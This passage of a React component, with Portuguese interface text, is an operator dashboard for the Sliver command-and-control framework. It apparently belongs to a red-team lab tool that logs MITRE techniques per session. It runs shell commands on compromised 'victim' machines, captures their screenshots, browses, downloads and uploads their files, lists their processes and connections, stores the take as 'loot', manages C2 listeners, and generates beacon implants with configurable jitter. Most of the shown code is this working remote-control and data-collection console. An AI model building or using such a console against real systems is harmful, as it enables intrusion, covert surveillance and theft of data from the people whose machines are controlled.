  const [uploadPolling, setUploadPolling] = useState(false);
  const uploadInputRef = useRef(null);

  // Processes
  const [psPolling, setPsPolling] = useState(false);
  const [psResult, setPsResult] = useState(null);
  const [psFilter, setPsFilter] = useState("");

  // Network
  const [netPolling, setNetPolling] = useState(false);
  const [netResult, setNetResult] = useState(null);

  // Loot
  const [loot, setLoot] = useState([]);
  const [lootLoading, setLootLoading] = useState(false);
  const [lootFilter, setLootFilter] = useState("all");

  // Listeners
  const [listeners, setListeners] = useState([]);
  const [listenerLoading, setListenerLoading] = useState(false);
  const [newListener, setNewListener] = useState({ protocol: "http", host: "", port: 80, domain: "" });
  const [listenerError, setListenerError] = useState(null);

  // Kill beacon
  const [killing, setKilling] = useState(null); // beacon_id being killed

  // Implants
  const [implantConfig, setImplantConfig] = useState({
    name: "", c2_url: "", protocol: "http", os: "windows",
    arch: "amd64", format: "exe", is_beacon: true,
    beacon_interval: 60, beacon_jitter: 30, debug: false,
  });
  const [implantLoading, setImplantLoading] = useState(false);
  const [implantResult, setImplantResult] = useState(null);
  const [implantError, setImplantError] = useState(null);

  const pollRefs = useRef({});

  // ── Effects ───────────────────────────────────────────────────────────────
  useEffect(() => {
    if (initialTarget) setSelectedTarget(initialTarget);
  }, [initialTarget]);

  // Cancel all polls when target changes & load persistent history
  useEffect(() => {
    Object.values(pollRefs.current).forEach(id => clearInterval(id));
    pollRefs.current = {};
    setCmdPolling(false); setSsPolling(false); setFilesPolling(false);
    setPsPolling(false); setNetPolling(false);
    setTermHistory([]); setTermInput("");
    if (selectedTarget) {
      fetchTerminalHistory(selectedTarget)
        .then(rows => setTermHistory(rows.map(r => ({ type: r.entry_type, text: r.content, ts: new Date(r.created_at).toLocaleTimeString("pt-BR") }))))
        .catch(() => {});
    }
  }, [selectedTarget]); // eslint-disable-line react-hooks/exhaustive-deps

  // Cancel all polls on unmount
  useEffect(() => () => {
    Object.values(pollRefs.current).forEach(id => clearInterval(id));
  }, []);

  // Scroll terminal to bottom on new output
  useEffect(() => {
    termEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [termHistory]);

  // Load loot when tab opens
  useEffect(() => {
    if (activeTab !== "loot") return;
    setLootLoading(true);
    fetchLoot().then(setLoot).catch(() => {}).finally(() => setLootLoading(false));
  }, [activeTab]);

  // Load listeners when tab opens
  useEffect(() => {
    if (activeTab !== "listeners" || !sliver.enabled) return;
    setListenerError(null);
    setListenerLoading(true);
    sliver.listListeners().then(d => setListeners(d.jobs || [])).catch(e => setListenerError(e.message)).finally(() => setListenerLoading(false));
  }, [activeTab]); // eslint-disable-line react-hooks/exhaustive-deps

  // ── Helpers ───────────────────────────────────────────────────────────────
  const isBeacon = Boolean(sliver.sessions.find(s => s.id === selectedTarget)?._type === "beacon");
  const selectedTargetInfo = sliver.sessions.find(s => s.id === selectedTarget);

  const startPoll = (key, taskId, onDone) => {
    clearInterval(pollRefs.current[key]);
    const interval = setInterval(async () => {
      try {
        const res = await sliver.getBeaconResult(selectedTarget, taskId);
        if (res.status !== "pending" && res.status !== "not_found") {
          clearInterval(interval);
          delete pollRefs.current[key];
          onDone(res);
        }
      } catch (err) {
        clearInterval(interval);
        delete pollRefs.current[key];
        onDone({ status: "error", error: err.message });
      }
    }, 5000);
    pollRefs.current[key] = interval;
  };

  const logTechnique = async (label, exe, args, result) => {
    if (!selectedLabSession) return;
    const preset = SLIVER_PRESETS.find(p => p.exe === exe) || { tactic: "Execution", mitreId: "T1059", label };
    const success = !(result.stderr || "").trim();
    const technique = await createTechnique({
      session_id: selectedLabSession,
      mitre_id: preset.mitreId,
      tactic: preset.tactic,
      technique_name: label,
      tool_used: "Sliver",
      success,
      notes: [result.stdout, result.stderr].filter(Boolean).join("\n").slice(0, 2000),
    });
    const nextTechniques = [technique, ...techniques];
    setTechniques(nextTechniques);
    const count = nextTechniques.filter(x => x.tactic === technique.tactic).length;
    upsertProgress(technique.tactic, count).catch(() => {});
  };

  const addTermEntry = (type, text) => {
    setTermHistory(h => [...h, { type, text, ts: new Date().toLocaleTimeString("pt-BR") }]);
    saveTerminalEntry({
      session_id: selectedLabSession || null,
      target_id: selectedTarget,
      target_hostname: selectedTargetInfo?.hostname || "",
      entry_type: type,
      content: text.slice(0, 10000),
    }).catch(() => {});
  };

  const saveToLoot = async (type, title, content, meta = {}) => {
    try {
      const entry = await saveLoot({
        session_id: selectedLabSession || null,
        target_id: selectedTarget,
        target_hostname: selectedTargetInfo?.hostname || "",
        loot_type: type,
        title,
        content,
        metadata: meta,
      });
      setLoot(l => [entry, ...l]);
    } catch { /* best-effort */ }
  };

  const handleKillBeacon = async (e, beaconId) => {
    e.stopPropagation();
    if (!window.confirm("Matar este beacon? O comando será enviado no próximo check-in.")) return;
    setKilling(beaconId);
    try {
      await sliver.killBeacon(beaconId);
      if (selectedTarget === beaconId) setSelectedTarget("");
      await sliver.refresh();
    } catch (err) {
      alert(`Erro ao matar beacon: ${err.message}`);
    } finally {
      setKilling(null);
    }
  };

  const osIcon = (os) => {
    const o = (os || "").toLowerCase();
    if (o.includes("windows")) return "";
    if (o.includes("linux")) return "";
    if (o.includes("darwin") || o.includes("mac")) return "";
    return "";
  };

  // ── Terminal run ──────────────────────────────────────────────────────────
  const runCmd = async (exe, args, label) => {
    if (!selectedTarget || running) return;
    const cmdStr = label || [exe, ...args].join(" ");
    addTermEntry("cmd", cmdStr);
    setRunning(true);
    setLogError(null);

    if (isBeacon) {
      try {
        const resp = await sliver.runTask(selectedTarget, exe, args, true);
        addTermEntry("info", " Aguardando check-in do beacon...");
        setCmdPolling(true);
        startPoll("commands", resp.task_id, (result) => {
          setCmdPolling(false);
          setRunning(false);
          if (result.stdout) addTermEntry("out", result.stdout);
          if (result.stderr) addTermEntry("err", result.stderr);
          logTechnique(cmdStr, exe, args, result).catch(err => setLogError(err.message));
          saveToLoot("command", cmdStr, [result.stdout, result.stderr].filter(Boolean).join("\n"), { exe, args });
        });
      } catch (err) {
        addTermEntry("err", err.message);
        setRunning(false);
      }
    } else {
      try {
        const result = await sliver.runTask(selectedTarget, exe, args, false);
        if (result.stdout) addTermEntry("out", result.stdout);
        if (result.stderr) addTermEntry("err", result.stderr);
        logTechnique(cmdStr, exe, args, result).catch(err => setLogError(err.message));
        saveToLoot("command", cmdStr, [result.stdout, result.stderr].filter(Boolean).join("\n"), { exe, args });
      } catch (err) {
        addTermEntry("err", err.message);
      } finally {
        setRunning(false);
      }
    }
  };

  const handleTermInput = (e) => {
    if (e.key === "Enter") {
      const line = termInput.trim();
      if (!line) return;
      const [exe, ...args] = line.split(/\s+/);
      runCmd(exe, args, line);
      setTermInput("");
      setTermHistIdx(-1);
    } else if (e.key === "ArrowUp") {
      const cmds = termHistory.filter(e => e.type === "cmd").map(e => e.text).reverse();
      const next = Math.min(termHistIdx + 1, cmds.length - 1);
      setTermHistIdx(next);
      if (cmds[next]) setTermInput(cmds[next]);
    } else if (e.key === "ArrowDown") {
      const cmds = termHistory.filter(e => e.type === "cmd").map(e => e.text).reverse();
      const next = Math.max(termHistIdx - 1, -1);
      setTermHistIdx(next);
      setTermInput(next === -1 ? "" : cmds[next] || "");
    }
  };

  // ── SysInfo quick ─────────────────────────────────────────────────────────
  const runSysInfo = () => {
    const isWin = (selectedTargetInfo?.os || "").toLowerCase().includes("windows");
    if (isWin) {
      runCmd("whoami", [], "whoami");
      setTimeout(() => runCmd("hostname", [], "hostname"), 500);
      setTimeout(() => runCmd("systeminfo", [], "systeminfo"), 1000);
    } else {
      runCmd("id", [], "id");
      setTimeout(() => runCmd("uname", ["-a"], "uname -a"), 500);
      setTimeout(() => runCmd("ifconfig", [], "ifconfig"), 1000);
    }
  };

  // ── Screenshot ────────────────────────────────────────────────────────────
  const takeScreenshot = async () => {
    if (!selectedTarget || !isBeacon) return;
    setSsPolling(true);
    setSsResult(null);
    try {
      const resp = await sliver.beaconAction(selectedTarget, "screenshot");
      startPoll("screenshot", resp.task_id, (result) => {
        setSsPolling(false);
        setSsResult(result);
      });
    } catch (err) {
      setSsPolling(false);
      setSsResult({ status: "error", error: err.message });
    }
  };

  const saveScreenshotToLoot = () => {
    if (!ssResult?.data) return;
    const title = `Screenshot — ${selectedTargetInfo?.hostname || selectedTarget} — ${new Date().toLocaleString("pt-BR")}`;
    saveToLoot("screenshot", title, ssResult.data, { hostname: selectedTargetInfo?.hostname });
  };

  // ── Files ─────────────────────────────────────────────────────────────────
  const listDir = async (path) => {
    if (!selectedTarget || !isBeacon) return;
    setFilesPolling(true);
    setFilesResult(null);
    try {
      const resp = await sliver.beaconAction(selectedTarget, "ls", { path });
      startPoll("files", resp.task_id, (result) => {
        setFilesPolling(false);
        setFilesResult(result);
        if (result.path) setFilesPath(result.path);
      });
    } catch (err) {
      setFilesPolling(false);
      setFilesResult({ status: "error", error: err.message });
    }
  };

  const goUp = () => {
    const sep = filesPath.includes("\\") ? "\\" : "/";
    const parts = filesPath.replace(/[/\\]+$/, "").split(/[/\\]/).filter(Boolean);
    if (parts.length <= 1) { listDir(filesPath); return; }
    listDir(parts.slice(0, -1).join(sep) || sep);
  };

  const downloadFileFromVictim = async (fileName) => {
    const sep = filesPath.includes("\\") ? "\\" : "/";
    const path = filesPath.replace(/[/\\]+$/, "") + sep + fileName;
    setDlPolling(p => ({ ...p, [fileName]: true }));
    try {
      const resp = await sliver.beaconAction(selectedTarget, "download", { path });
      startPoll(`dl-${fileName}`, resp.task_id, (result) => {
        setDlPolling(p => ({ ...p, [fileName]: false }));
        if (result.status === "ok" && result.data) {
          const bytes = Uint8Array.from(atob(result.data), c => c.charCodeAt(0));
          const blob = new Blob([bytes]);
          const url = URL.createObjectURL(blob);
          const a = document.createElement("a");
          a.href = url; a.download = result.name || fileName;
          a.click(); URL.revokeObjectURL(url);
          saveToLoot("file", `${fileName} — ${selectedTargetInfo?.hostname}`, result.data, { path, size: result.size });
        }
      });
    } catch (err) {
      setDlPolling(p => ({ ...p, [fileName]: false }));
    }
  };

  const handleUploadFile = async () => {
    if (!uploadFile || !uploadPath.trim()) return;
    setUploadPolling(true);
    try {
      const reader = new FileReader();
      reader.onload = async (e) => {
        const b64 = btoa(String.fromCharCode(...new Uint8Array(e.target.result)));
        const resp = await sliver.beaconAction(selectedTarget, "upload", { path: uploadPath, data: b64 });
        startPoll("upload", resp.task_id, () => {
          setUploadPolling(false);
          setUploadFile(null);
          setUploadPath("");
        });
      };
      reader.readAsArrayBuffer(uploadFile);
    } catch (err) {
      setUploadPolling(false);
    }
  };

  // ── Processes ─────────────────────────────────────────────────────────────
  const listProcesses = async () => {
    if (!selectedTarget || !isBeacon) return;
    setPsPolling(true);
    setPsResult(null);
    try {
      const resp = await sliver.beaconAction(selectedTarget, "ps");
      startPoll("ps", resp.task_id, (result) => {
        setPsPolling(false);
        setPsResult(result);
      });
    } catch (err) {
      setPsPolling(false);
      setPsResult({ status: "error", error: err.message });
    }
  };

  // ── Network ───────────────────────────────────────────────────────────────
  const listNetwork = async () => {
    if (!selectedTarget || !isBeacon) return;
    setNetPolling(true);
    setNetResult(null);
    try {
      const resp = await sliver.beaconAction(selectedTarget, "netstat");
      startPoll("netstat", resp.task_id, (result) => {
        setNetPolling(false);
        setNetResult(result);
      });
    } catch (err) {
      setNetPolling(false);
      setNetResult({ status: "error", error: err.message });
    }
  };

  // ── Listeners ─────────────────────────────────────────────────────────────
  const refreshListeners = async () => {
    setListenerLoading(true);
    setListenerError(null);
    try {
      const d = await sliver.listListeners();
      setListeners(d.jobs || []);
    } catch (e) {
      setListenerError(e.message);
    } finally {
      setListenerLoading(false);
    }
  };

  const startListener = async () => {
    setListenerError(null);
    try {
      await sliver.createListener(newListener);
      await refreshListeners();
      setNewListener({ protocol: "http", host: "", port: 80, domain: "" });
    } catch (e) {
      setListenerError(e.message);
    }
  };

  const killListener = async (id) => {
    try {
      await sliver.stopListener(id);
      setListeners(l => l.filter(j => j.id !== id));
    } catch (e) {
      setListenerError(e.message);
    }
  };

  // ── Implants ──────────────────────────────────────────────────────────────
  const handleGenerate = async () => {
    if (!implantConfig.c2_url.trim()) return;
    setImplantLoading(true);
    setImplantResult(null);
    setImplantError(null);
    try {
      const res = await sliver.generateImplant(implantConfig);
      setImplantResult(res);
      if (res.data) {
        const bytes = Uint8Array.from(atob(res.data), c => c.charCodeAt(0));
        const blob = new Blob([bytes]);
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url; a.download = res.name || "implant";
        a.click(); URL.revokeObjectURL(url);
      }
    } catch (e) {
      setImplantError(e.message);
    } finally {
      setImplantLoading(false);
    }
  };

  // ── Tab config ────────────────────────────────────────────────────────────
  const TABS = [
    { id: "commands",   label: " Terminal" },
    { id: "screenshot", label: " Screenshot", beaconOnly: true },
    { id: "files",      label: " Arquivos",   beaconOnly: true },
    { id: "processes",  label: " Processos",  beaconOnly: true },
    { id: "network",    label: " Rede",        beaconOnly: true },
    { id: "loot",       label: " Loot" },
    { id: "listeners",  label: " Listeners" },
    { id: "implants",   label: " Implants" },
  ];

  const Pending = ({ msg }) => (
    <div className="flex items-center gap-2 text-cyber-warning text-xs py-3">
      <span className="animate-pulse"></span>
      {msg} — próximo check-in em até ~60s
    </div>
  );

  // ── Render ────────────────────────────────────────────────────────────────
  return (
    <div>
      <InfoBox title={SECTION_INFO.c2.title} icon={SECTION_INFO.c2.icon}>{SECTION_INFO.c2.content}</InfoBox>
      {/* Header */}
      <div className="flex justify-between items-center mb-4">
        <span className="text-xs text-cyber-muted">{sliver.sessions.length} conexão(ões) ativa(s)</span>
        <button onClick={sliver.refresh} className={BTN_GHOST}>↻ ATUALIZAR</button>
      </div>

      {sliver.error && (
        <div className={`${CARD} mb-4 text-cyber-danger text-xs`}>Erro ao falar com a bridge: {sliver.error}</div>
      )}

      {/* Machine cards */}
      <div className="text-xs text-cyber-muted mb-2">MÁQUINAS CONECTADAS</div>
      {sliver.sessions.length === 0 ? (
        <div className={`${CARD} text-center py-10 text-cyber-muted mb-4`}>
          <div className="text-3xl mb-2"></div>Nenhuma conexão ativa no momento
        </div>
      ) : (
        <div className="grid gap-2.5 mb-4" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(min(220px, 100%), 1fr))" }}>
          {sliver.sessions.map(s => (
            <div key={s.id} onClick={() => setSelectedTarget(s.id)}
              className={`${CARD} text-left cursor-pointer border-2 relative`}
              style={{ borderColor: selectedTarget === s.id ? "#10B981" : "#1E293B" }}>
              <div className="flex items-center gap-2 mb-2 pr-6">
                <span className="text-lg">{osIcon(s.os)}</span>
                <span className="text-sm font-bold text-cyber-text truncate">{s.hostname || "(sem hostname)"}</span>
              </div>
              <div className="text-[11px] text-cyber-muted"> {s.username || "—"}</div>
              <div className="text-[11px] text-cyber-muted"> {s.remote_address || "—"}</div>
              <div className="text-[11px] text-cyber-muted"> {s.last_checkin ? fmtDate(s.last_checkin) : "—"}</div>
              {s._type === "beacon" && (
                <div className="flex items-center justify-between mt-1">
                  <div className="text-[10px] text-cyber-warning"> BEACON</div>
                  <button
                    onClick={(e) => handleKillBeacon(e, s.id)}
                    disabled={killing === s.id}
                    title="Matar beacon"
                    className="text-[11px] text-cyber-danger hover:text-red-400 disabled:opacity-40 px-1"
                  >
                    {killing === s.id ? "..." : " Kill"}
                  </button>
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Lab session */}
      <div className={`${CARD} mb-4`}>
        <label className={LABEL}>Registrar comandos em (sessão de lab)</label>
        <select className={INPUT} value={selectedLabSession} onChange={e => setSelectedLabSession(e.target.value)}>
          <option value="">— Sem sessão —</option>
          {sessions.map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
        </select>
      </div>

      {/* Tabs */}
      <div className="flex gap-1 mb-4 flex-wrap overflow-x-auto scrollbar-hide">
        {TABS.filter(t => !t.beaconOnly || (selectedTarget && isBeacon)).map(t => (
          <button key={t.id} onClick={() => setActiveTab(t.id)}
            className={`text-[10px] sm:text-xs px-2 sm:px-3 py-1.5 rounded font-mono border transition-colors flex-shrink-0 ${
              activeTab === t.id
                ? "bg-cyber-accent text-white border-cyber-accent"
                : "bg-cyber-surface text-cyber-muted border-cyber-border hover:text-cyber-text"
            }`}>
            {t.label}
          </button>
        ))}
      </div>

      {/* ── Terminal ──────────────────────────────────────────────────────── */}
      {activeTab === "commands" && (
        <div className={`${CARD} mb-4`}>
          <div className="flex items-center justify-between mb-3">
            <div className="text-xs text-cyber-muted">
              TERMINAL{selectedTargetInfo ? ` — ${selectedTargetInfo.hostname}` : ""}
            </div>
            <div className="flex gap-2">
              <button onClick={runSysInfo} disabled={!selectedTarget || running}
                className={`${BTN_GHOST} text-xs disabled:opacity-40`}>ℹ SysInfo</button>
              <button onClick={() => { setTermHistory([]); if (selectedTarget) clearTerminalHistory(selectedTarget).catch(() => {}); }} className={`${BTN_GHOST} text-xs`}> Limpar</button>
            </div>
          </div>

          {/* Presets */}
          <div className="flex flex-wrap gap-1.5 mb-3">
            {SLIVER_PRESETS.map(p => (
              <button key={p.label} disabled={!selectedTarget || running || cmdPolling}
                onClick={() => runCmd(p.exe, p.args, p.label)}
                className="text-[11px] bg-cyber-bg border border-cyber-border rounded px-2 py-1 font-mono text-cyber-muted hover:border-cyber-accent hover:text-cyber-accent transition-colors disabled:opacity-40">
                {p.label}
              </button>
            ))}
          </div>

          {/* Output */}
          <div className="bg-cyber-bg border border-cyber-border rounded-md p-3 font-mono text-xs max-h-72 overflow-y-auto mb-3">
            {termHistory.length === 0 && (
              <div className="text-cyber-muted">
                {selectedTarget ? "$ _" : "Selecione uma máquina acima para começar."}
              </div>
            )}
            {termHistory.map((e, i) => (
              <div key={i} className="mb-1">
                {e.type === "cmd" && (
                  <div className="text-cyber-accent">
                    <span className="text-cyber-muted">[{e.ts}] </span>$ {e.text}
                  </div>
                )}
                {e.type === "out" && <pre className="text-cyber-text whitespace-pre-wrap">{e.text}</pre>}
                {e.type === "err" && <pre className="text-cyber-danger whitespace-pre-wrap">{e.text}</pre>}
                {e.type === "info" && <div className="text-cyber-warning">{e.text}</div>}
              </div>
            ))}
            {cmdPolling && <Pending msg="Aguardando resultado" />}
            <div ref={termEndRef} />
          </div>

          {/* Input */}
          <div className="flex items-center gap-2">
            <span className="text-cyber-accent font-mono text-xs">$</span>
            <input
              className={`${INPUT} flex-1`}
              placeholder={selectedTarget ? "comando arg1 arg2..." : "selecione uma máquina primeiro"}
              disabled={!selectedTarget || running || cmdPolling}
              value={termInput}
              onChange={e => setTermInput(e.target.value)}
              onKeyDown={handleTermInput}
            />
            <button
              disabled={!selectedTarget || !termInput.trim() || running || cmdPolling}
              onClick={() => {
                const [exe, ...args] = termInput.trim().split(/\s+/);
                runCmd(exe, args, termInput.trim());
                setTermInput("");
              }}
              className={`${BTN} disabled:opacity-40`}>
              
            </button>
          </div>
          <div className="text-[10px] text-cyber-muted mt-2">
            ↑↓ histórico · Enter executa ·{" "}
            {isBeacon
              ? "beacon: aguarda check-in para retornar resultado"
              : "sessão interativa: resultado imediato"}
          </div>
          {logError && <div className="text-cyber-warning text-xs mt-2">Aviso Supabase: {logError}</div>}
        </div>
      )}

      {/* ── Screenshot ────────────────────────────────────────────────────── */}
      {activeTab === "screenshot" && selectedTarget && isBeacon && (
        <div className={`${CARD} mb-4`}>
          <div className="flex items-center justify-between mb-3">
            <div className="text-xs text-cyber-muted">SCREENSHOT DA VÍTIMA</div>
            <div className="flex gap-2">
              {ssResult?.data && (
                <button onClick={saveScreenshotToLoot} className={`${BTN_GHOST} text-xs`}>
                   Salvar no Loot
                </button>
              )}
              <button onClick={takeScreenshot} disabled={ssPolling} className={`${BTN} disabled:opacity-40`}>
                {ssPolling ? " Capturando..." : " Tirar Screenshot"}
              </button>
            </div>
          </div>
          {ssPolling && <Pending msg="Capturando screenshot" />}
          {ssResult?.status === "error" && (
            <div className="text-cyber-danger text-xs mt-2">{ssResult.error}</div>
          )}
          {ssResult?.data && (
            <img src={`data:image/png;base64,${ssResult.data}`} alt="Screenshot"
              className="w-full rounded border border-cyber-border mt-2"
              style={{ maxHeight: 500, objectFit: "contain" }} />
          )}
          {!ssResult && !ssPolling && (
            <div className="text-cyber-muted text-xs text-center py-8">
              Clique em "Tirar Screenshot" para capturar a tela da vítima
            </div>
          )}
        </div>
      )}

      {/* ── Files ─────────────────────────────────────────────────────────── */}
      {activeTab === "files" && selectedTarget && isBeacon && (
        <div className="flex flex-col gap-3">
          <div className={CARD}>
            <div className="flex items-center gap-2 mb-3">
              <div className="text-xs text-cyber-muted font-mono flex-1 truncate"> {filesPath}</div>
              <button onClick={goUp} disabled={filesPolling} className={`${BTN_GHOST} text-xs`}>↑ Subir</button>
              <button onClick={() => { if(uploadInputRef.current) uploadInputRef.current.click(); }} className={`${BTN_GHOST} text-xs`}>⬆ Upload</button>
              <button onClick={() => listDir(filesPath)} disabled={filesPolling} className={`${BTN} text-xs`}>
                {filesPolling ? "..." : "Listar"}
              </button>
            </div>

            {/* Upload area */}
            <input ref={uploadInputRef} type="file" className="hidden"
              onChange={e => { setUploadFile(e.target.files[0]); setUploadPath(filesPath.replace(/[/\\]+$/, "") + (filesPath.includes("\\") ? "\\" : "/") + e.target.files[0]?.name); }} />
            {uploadFile && (
              <div className="bg-cyber-bg border border-cyber-border rounded p-2 mb-3 flex items-center gap-2 text-xs">
                <span className="text-cyber-text flex-1 truncate">⬆ {uploadFile.name} → {uploadPath}</span>
                <input className={`${INPUT} w-52`} value={uploadPath} onChange={e => setUploadPath(e.target.value)} placeholder="path destino" />
                <button onClick={handleUploadFile} disabled={uploadPolling} className={`${BTN} text-xs disabled:opacity-40`}>
                  {uploadPolling ? "..." : "Enviar"}
                </button>
                <button onClick={() => setUploadFile(null)} className="text-cyber-danger text-xs"></button>
              </div>
            )}

            {filesPolling && <Pending msg="Listando diretório" />}
            {filesResult?.status === "error" && (
              <div className="text-cyber-danger text-xs">{filesResult.error}</div>
            )}
            {filesResult?.files && (
              <div className="overflow-x-auto">
                <table className="w-full text-xs font-mono">
                  <thead>
                    <tr className="text-cyber-muted border-b border-cyber-border">
                      <th className="text-left py-1 pr-2 w-5"></th>
                      <th className="text-left py-1 pr-3">Nome</th>
                      <th className="text-left py-1 pr-3">Tamanho</th>
                      <th className="text-left py-1 pr-3">Modo</th>
                      <th className="text-left py-1"></th>
                    </tr>
                  </thead>
                  <tbody>
                    {[...filesResult.files]
                      .sort((a, b) => (b.is_dir ? 1 : 0) - (a.is_dir ? 1 : 0) || a.name.localeCompare(b.name))
                      .map((f, i) => (
                        <tr key={i}
                          className="border-b border-cyber-border/30 hover:bg-white/5"
                          onClick={() => {
                            if (!f.is_dir) return;
                            const sep = filesPath.includes("\\") ? "\\" : "/";
                            listDir(filesPath.replace(/[/\\]+$/, "") + sep + f.name);
                          }}
                          style={{ cursor: f.is_dir ? "pointer" : "default" }}>
                          <td className="py-1 pr-2">{f.is_dir ? "" : ""}</td>
                          <td className={`py-1 pr-3 ${f.is_dir ? "text-cyber-accent" : "text-cyber-text"}`}>{f.name}</td>
                          <td className="py-1 pr-3 text-cyber-muted">{f.is_dir ? "—" : fmtBytes(f.size)}</td>
                          <td className="py-1 pr-3 text-cyber-muted">{f.mode}</td>
                          <td className="py-1">
                            {!f.is_dir && (
                              <button
                                onClick={ev => { ev.stopPropagation(); downloadFileFromVictim(f.name); }}
                                disabled={dlPolling[f.name]}
                                className="text-[10px] text-cyber-accent hover:text-white disabled:opacity-40 border border-cyber-border rounded px-1.5 py-0.5">
                                {dlPolling[f.name] ? "" : "⬇"}
                              </button>
                            )}
                          </td>
                        </tr>
                      ))}
                  </tbody>
                </table>
              </div>
            )}
            {!filesResult && !filesPolling && (
              <div className="text-cyber-muted text-xs text-center py-8">
                Clique em "Listar" para ver os arquivos do diretório atual
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── Processes ─────────────────────────────────────────────────────── */}
      {activeTab === "processes" && selectedTarget && isBeacon && (
        <div className={`${CARD} mb-4`}>
          <div className="flex items-center justify-between mb-3">
            <div className="text-xs text-cyber-muted">PROCESSOS EM EXECUÇÃO</div>
            <div className="flex gap-2 items-center">
              <input className={`${INPUT} w-40`} placeholder="filtrar..." value={psFilter} onChange={e => setPsFilter(e.target.value)} />
              <button onClick={listProcesses} disabled={psPolling} className={`${BTN} text-xs`}>
                {psPolling ? "..." : " Atualizar"}
              </button>
            </div>
          </div>
          {psPolling && <Pending msg="Listando processos" />}
          {psResult?.status === "error" && (
            <div className="text-cyber-danger text-xs">{psResult.error}</div>
          )}
          {psResult?.processes && (
            <div className="overflow-x-auto max-h-96 overflow-y-auto">
              <table className="w-full text-xs font-mono">
                <thead className="sticky top-0 bg-cyber-surface">
                  <tr className="text-cyber-muted border-b border-cyber-border">
                    <th className="text-left py-1 pr-3">PID</th>
                    <th className="text-left py-1 pr-3">PPID</th>
                    <th className="text-left py-1 pr-3">Nome</th>
                    <th className="text-left py-1">Dono</th>
                  </tr>
                </thead>
                <tbody>
                  {[...psResult.processes]
                    .filter(p => !psFilter || p.name?.toLowerCase().includes(psFilter.toLowerCase()) || String(p.pid).includes(psFilter) || (p.owner || "").toLowerCase().includes(psFilter.toLowerCase()))
                    .sort((a, b) => a.pid - b.pid)
                    .map((p, i) => (
                      <tr key={i} className="border-b border-cyber-border/30 hover:bg-white/5">
                        <td className="py-0.5 pr-3 text-cyber-accent">{p.pid}</td>
                        <td className="py-0.5 pr-3 text-cyber-muted">{p.ppid}</td>
                        <td className="py-0.5 pr-3 text-cyber-text">{p.name}</td>
                        <td className="py-0.5 text-cyber-muted">{p.owner}</td>
                      </tr>
                    ))}
                </tbody>
              </table>
            </div>
          )}
          {!psResult && !psPolling && (
            <div className="text-cyber-muted text-xs text-center py-8">
              Clique em "Atualizar" para listar os processos em execução
            </div>
          )}
        </div>
      )}

      {/* ── Network ───────────────────────────────────────────────────────── */}
      {activeTab === "network" && selectedTarget && isBeacon && (
        <div className={`${CARD} mb-4`}>
          <div className="flex items-center justify-between mb-3">
            <div className="text-xs text-cyber-muted">CONEXÕES DE REDE</div>
            <button onClick={listNetwork} disabled={netPolling} className={`${BTN} text-xs`}>
              {netPolling ? "..." : " Atualizar"}
            </button>
          </div>
          {netPolling && <Pending msg="Coletando conexões de rede" />}
          {netResult?.status === "error" && (
            <div className="text-cyber-danger text-xs">{netResult.error}</div>
          )}
          {netResult?.entries && (
            <div className="overflow-x-auto max-h-96 overflow-y-auto">
              <table className="w-full text-xs font-mono">
                <thead className="sticky top-0 bg-cyber-surface">
                  <tr className="text-cyber-muted border-b border-cyber-border">
                    <th className="text-left py-1 pr-2">Proto</th>
                    <th className="text-left py-1 pr-2">Local</th>
                    <th className="text-left py-1 pr-2">Remoto</th>
                    <th className="text-left py-1 pr-2">Estado</th>
                    <th className="text-left py-1 pr-2">PID</th>
                    <th className="text-left py-1">Processo</th>
                  </tr>
                </thead>
                <tbody>
                  {netResult.entries.map((e, i) => (
                    <tr key={i} className="border-b border-cyber-border/30 hover:bg-white/5">
                      <td className="py-0.5 pr-2 text-cyber-accent">{e.proto}</td>
                      <td className="py-0.5 pr-2 text-cyber-text">{e.local}</td>
                      <td className="py-0.5 pr-2 text-cyber-muted">{e.remote}</td>
                      <td className={`py-0.5 pr-2 ${e.state === "LISTEN" ? "text-cyber-warning" : "text-cyber-text"}`}>{e.state}</td>
                      <td className="py-0.5 pr-2 text-cyber-muted">{e.pid || "—"}</td>
                      <td className="py-0.5 text-cyber-muted">{e.process}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
          {!netResult && !netPolling && (
            <div className="text-cyber-muted text-xs text-center py-8">
              Clique em "Atualizar" para ver as conexões de rede
            </div>
          )}
        </div>
      )}

      {/* ── Loot Board ────────────────────────────────────────────────────── */}
      {activeTab === "loot" && (
        <div>
          <div className="flex items-center justify-between mb-3">
            <div className="flex gap-1">
              {["all", "screenshot", "command", "file"].map(f => (
                <button key={f} onClick={() => setLootFilter(f)}
                  className={`text-[11px] px-2 py-1 rounded font-mono border transition-colors ${
                    lootFilter === f
                      ? "bg-cyber-accent text-white border-cyber-accent"
                      : "bg-cyber-surface text-cyber-muted border-cyber-border"
                  }`}>
                  {f === "all" ? "Todos" : f === "screenshot" ? "" : f === "command" ? "" : ""}
                </button>
              ))}
            </div>
            <span className="text-xs text-cyber-muted">{loot.length} item(s)</span>
          </div>

          {lootLoading && <div className={`${CARD} text-cyber-muted text-xs text-center py-8`}>Carregando loot...</div>}

          {!lootLoading && loot.length === 0 && (
            <div className={`${CARD} text-center py-10 text-cyber-muted`}>
              <div className="text-3xl mb-2"></div>
              <div>Nenhum loot capturado ainda</div>
              <div className="text-[11px] mt-1">Screenshots, outputs e arquivos serão salvos aqui automaticamente</div>
            </div>
          )}

          <div className="grid gap-3" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(260px, 1fr))" }}>
            {loot
              .filter(l => lootFilter === "all" || l.loot_type === lootFilter)
              .map(l => (
                <div key={l.id} className={`${CARD} flex flex-col gap-2`}>
                  <div className="flex justify-between items-start">
                    <span className="text-[10px] px-1.5 py-0.5 rounded font-mono"
                      style={{
                        background: l.loot_type === "screenshot" ? "#1a2a1a" : l.loot_type === "command" ? "#1a1a2a" : "#2a1a1a",
                        color: l.loot_type === "screenshot" ? "#4ade80" : l.loot_type === "command" ? "#60a5fa" : "#f97316",
                      }}>
                      {l.loot_type === "screenshot" ? "" : l.loot_type === "command" ? "" : ""} {l.loot_type}
                    </span>
                    <button onClick={async () => { await deleteLoot(l.id); setLoot(lt => lt.filter(x => x.id !== l.id)); }}
                      className="text-cyber-danger text-xs hover:text-red-400"></button>
                  </div>
                  <div className="text-[12px] text-cyber-text font-bold truncate">{l.title}</div>
